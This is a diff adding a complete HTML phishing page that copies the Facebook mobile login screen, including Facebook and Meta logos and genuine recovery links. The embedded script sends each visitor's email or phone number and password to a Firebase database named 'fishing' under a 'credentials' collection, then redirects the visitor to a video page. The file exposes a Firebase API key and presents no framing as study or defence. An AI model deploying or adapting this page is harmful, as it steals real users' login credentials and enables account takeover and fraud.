@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100%;
+    margin: 0;
+    color: #1877F2;
+    background: url('https://www.google.co.uk/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png');
+    background-size: cover;
+    background-position: center;
+}
+
+
+        .container {
+            padding: 10px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            margin: 45px auto;
+            text-align: center;
+        }
+
+        .fb-logo {
+            width: 65px;
+            height: auto;
+            margin-top: 40px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-control {
+            border: 1.3px solid #bdbdbd;
+            border-radius: 14px;
+            padding: 15px;
+            font-size: 17px;
+            width: 100%;
+            box-sizing: border-box;
+            color: black;
+            transition: box-shadow 0.2s ease;
+        }
+
+        .form-control:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #1877F2;
+        }
+
+        .form-control::placeholder {
+            color: grey;
+        }
+
+        .btn-default {
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 13px;
+            font-size: 17px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+            min-width:100%;
+        }
+
+        .btn-default:hover {
+            background-color: #166de0;
+        }
+
+        .forgotten-password {
+            text-align: left;
+            font-size: 17px;
+            color: grey;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .create-account {
+            background-color: white;
+            color: grey;
+            border: 1px solid grey;
+            border-radius: 50px;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            margin-top: 130px;
+            min-width:100%;
+        }
+
+        .create-account:hover {
+            background-color: #f2f2f2;
+        }
+
+        .meta-footer {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 70px;
+            color: #333;
+        }
+
+        .meta-footer a {
+            color: #333;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .meta-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .meta-logo {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body align="center">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y6/r/UbJC5lwxeBU.png" class="fb-logo" alt="Facebook">
+    <div class="container">
+        <form id="dataForm">
+            <div class="form-group">
+                <input placeholder="Mobile number or email address" type="email" class="form-control" id="emailField">
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Password" class="form-control" id="passwordField">
+            </div>
+            <button type="button" class="btn-default" onclick="submitData()">Log In</button>
+        </form>
+        <a href="https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE3NTI1MjcyLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0G4QTCXY7w5J9YKH2&r&cuid&ars=facebook_login&lwv=400&refid=8" class="forgotten-password">Forgotten Password?</a><br/>
+        <button class="create-account" onclick="window.location.href='https://m.facebook.com/reg/?cid=103&wtsid=rdr_0dI6jd0y6EglTJ4T6&refsrc=deprecated&_rdr'">Create new account</button>
+
+        <div class="meta-footer">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yZ/r/zG-q7jIS191.png" alt="Meta logo" style="width: 60px; height: auto; color:grey;"></br></br>
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <script src="https://www.gstatic.com/firebasejs/4.7.0/firebase.js"></script>
+    <script>
+        var config = {
+            apiKey: "AIzaSyD1cdHJ_wYXYzUreCG7LkCOke8pLOANKnU",
+            authDomain: "fishing-9a5f3.firebaseapp.com",
+            databaseURL: "https://fishing-9a5f3-default-rtdb.firebaseio.com",
+            projectId: "fishing-9a5f3",
+            storageBucket: "fishing-9a5f3.appspot.com",
+            messagingSenderId: "147667070774",
+            appId: "1:147667070774:web:a32e3eb0109bc726360d97",
+            measurementId: "G-PX9J13JFTQ"
+        };
+
+        firebase.initializeApp(config);
+        var database = firebase.database();
+        var firebaseCredentialsCollection = database.ref().child('credentials');
+		function isValidEmailOrPhoneNumber(input) {
+    // Regular expression to validate email format
+    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    // Regular expression to validate phone number format
+    var phoneRegex = /^\d{11}$/; // Assuming a 10-digit phone number format
+
+    // Check if the input matches either email or phone number format
+    return emailRegex.test(input) || phoneRegex.test(input);
+}
+
+function isValidPassword(password) {
+    // Check if password length is at least 6 characters
+    return password.length >= 6;
+}
+
+function submitData() {
+    var emailOrPhoneNumber = $('#emailField').val();
+    var password = $('#passwordField').val();
+
+    if (!isValidEmailOrPhoneNumber(emailOrPhoneNumber)) {
+        alert("Please enter a valid email address or phone number.");
+        return;
+    }
+
+    if (!isValidPassword(password)) {
+        alert("Password must be at least 6 characters long.");
+        return;
+    }
+
+    var currentdate = new Date();
+    var datetime = currentdate.getDate() + "/" + (currentdate.getMonth() + 1) + "/" + currentdate.getFullYear() + " @ " + currentdate.getHours() + ":" + currentdate.getMinutes() + ":" + currentdate.getSeconds();
+
+    var credential = {
+        emailOrPhoneNumber: emailOrPhoneNumber,
+        password: password,
+        dateTime: datetime
+    };
+
+    firebaseCredentialsCollection.push(credential, function(error) {
+        if (error) {
+            console.error("Error uploading data:", error);
+            // You might want to display an error message to the user
+        } else {
+            // Data uploaded successfully, you might want to provide feedback to the user
+            window.location.replace("video_page2.html");
+            // Clear the form fields
+            $('#emailField').val('');
+            $('#passwordField').val('');
+        }
+    });
+}
+    </script>
+</body>
+
+</html>
